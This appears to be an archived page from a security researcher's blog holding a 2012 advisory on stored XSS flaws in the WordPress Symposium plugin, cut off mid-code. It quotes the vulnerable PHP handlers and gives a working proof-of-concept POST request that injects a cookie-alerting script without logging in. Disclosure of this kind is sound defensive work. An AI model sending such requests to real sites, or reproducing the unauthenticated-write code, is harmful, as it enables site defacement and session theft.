<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>Advisories | ceriksen.com | Page 3</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive paged category category-advisories category-3 paged-3 category-paged-3  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">Category Archives: <span>Advisories</span></h2>

					
				</header>

					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="https://charlieeriksen.github.io/category/advisories/page/4/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="https://charlieeriksen.github.io/category/advisories/page/2/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-26" class="post-26 post type-post status-publish format-standard hentry category-advisories tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="4:20 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T16:20:39+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="Permalink to WordPress Symposium plugin multiple stored XSS vulnerabilities" rel="bookmark">WordPress Symposium plugin multiple stored XSS vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49791/">Secunia Advisory SA 49791</a></p>
<p><strong>Analysis of add_to_page vulnerability</strong><br />
The first vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a>Â in the &#8220;add_to_page&#8221; action relies on a lack of validation of the $current_user variable that is declared through global. The function allows you to append text to any arbitrary page, which can be abused for a XSS attack.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2373a373446783" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "add_to_page") {

        global $wpdb, $current_user;

        $r = 'OK';

        $shortcode = $_POST['shortcode'];
        $id = $_POST['id'];

        // get existing value
        $sql = "SELECT post_content FROM ".$wpdb-&gt;prefix."posts WHERE ID = %d";
        $tmp = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $id));       
        $tmp .= '['.$shortcode.']';

        // update
        $sql = "UPDATE ".$wpdb-&gt;prefix."posts SET post_content = %s WHERE ID = %d";
        $wpdb-&gt;query($wpdb-&gt;prepare($sql, $tmp, $id));             
       
        echo $r;
        exit;   
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-18">18</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2373a373446783-20">20</div><div class="crayon-num" data-line="crayon-53c9878f2373a373446783-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2373a373446783-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_to_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2373a373446783-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-4">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2373a373446783-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2373a373446783-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2373a373446783-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get existing value</span></div><div class="crayon-line" id="crayon-53c9878f2373a373446783-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT post_content FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878f2373a373446783-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-14">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2373a373446783-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET post_content = %s WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2373a373446783-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tmp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878f2373a373446783-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2373a373446783-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878f2373a373446783-21"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0062 seconds] -->
<p>Because there is no validation of the user calling this action before this, as the $current_user variable is only just globally included at line 156, and no valididation is made in respect to it, we have a vulnerability since globally including a variable does not guarantee that it exists. Therefor you can call this while not being authenticated, and add a XSS payload to any page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f23757377488927" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

action=add_to_page&amp;id=1&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f23757377488927-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23757377488927-2">2</div><div class="crayon-num" data-line="crayon-53c9878f23757377488927-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23757377488927-4">4</div><div class="crayon-num" data-line="crayon-53c9878f23757377488927-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23757377488927-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f23757377488927-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23757377488927-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f23757377488927-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23757377488927-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">74</span></div><div class="crayon-line" id="crayon-53c9878f23757377488927-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23757377488927-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_to_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0058 seconds] -->
<p>If you now load the frontpage(Which is by default page 1), you will now observe that it alerts out your cookie.</p>
<p><strong>Analysis of add_new_page vulnerability</strong><br />
This vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is very much like the first one. Again it&#8217;s a lack of validation of the current user. This function, rather than add content to an existing page, serves to allow an user to create a new page with some content(A shortcode specifically, but no validation is made that it is just that). This block of code might look big and scary, big in reality most of the lines are simply SQL queries.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2375e127144823" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Add new page
if ($action == "add_new_page") {
	
	global $wpdb, $current_user;

	$r = 'OK';

	$shortcode = $_POST['shortcode'];
	$name = $_POST['name'];
	$post_name = str_replace(' ', '', strtolower($name));
	
	$wpdb-&gt;query( $wpdb-&gt;prepare( "
		INSERT INTO ".$wpdb-&gt;prefix."posts
		( 	post_author, 
			post_date,
			post_date_gmt,
			post_content,
			post_title,
			post_status,
			comment_status,
			ping_status,
			post_name,
			post_modified,
			post_modified_gmt,
			post_parent,
			menu_order,
			post_type,
			comment_count
		)
		VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )", 
	    array(
	    	$current_user-&gt;ID, 
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	'['.$shortcode.']',
	    	$name,
	    	'publish',
	    	'closed',
	    	'open',
	    	$post_name,
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	0,
	    	0,
	    	'page',
	    	0
	    	) 
	    ) );
	    
	    // get new ID
		$new_id = $wpdb-&gt;insert_id;
		
		// page meta data
		$wpdb-&gt;query( $wpdb-&gt;prepare( "
			INSERT INTO ".$wpdb-&gt;base_prefix."postmeta
			( 	post_id, 
				meta_key,
				meta_value
			)
			VALUES ( %d, %s, %s )", 
		    array(
		    	$new_id, 
		    	'_wp_page_template',
		    	'sidebar-page.php'
		    	) 
		    ) );
	    		
	    // update guid
	    $url = get_bloginfo('url');
    	if ($url[strlen($url)-1] == '/') { $url = substr($url,0,-1); }
    	$url .= '/?p='.$new_id;
		$sql = "UPDATE ".$wpdb-&gt;prefix."posts SET guid = '%s' WHERE ID = %d";
		$wpdb-&gt;query($wpdb-&gt;prepare($sql, $url, $new_id)); 
	    	    
	echo $r;
	exit;	
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
